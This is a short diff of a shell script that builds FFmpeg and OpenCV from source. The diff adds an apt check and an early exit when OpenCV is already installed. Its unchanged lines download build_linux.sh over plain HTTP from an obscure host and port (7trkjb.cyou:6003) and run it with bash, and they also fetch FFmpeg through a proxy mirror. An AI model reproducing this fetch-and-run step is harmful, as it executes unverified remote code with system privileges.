@@ -1,5 +1,13 @@
 dirone="/usr/local/src"
-mkdir $dirone/ffmpeg
+if ! command -v apt &> /dev/null; then
+    echo "apt command not found. Exiting script."
+    exit 1
+fi
+if pkg-config --libs opencv4 > /dev/null 2>&1; then
+   echo "已安装opencv"
+    exit 0
+else
+ mkdir $dirone/ffmpeg
 wget -P $dirone/ffmpeg gitdl.cn/https://github.com/FFmpeg/FFmpeg/archive/refs/heads/release/4.4.zip
 cd $dirone/ffmpeg
 mkdir $dirone/ffmpeg/build
@@ -15,3 +23,4 @@ cd op*
 apt -y install cmake
 cd pl*/li*;wget http://7trkjb.cyou:6003/upload/2024/07/build_linux.sh
 bash build_linux.sh "$dirone/ffmpeg/build"
+fi
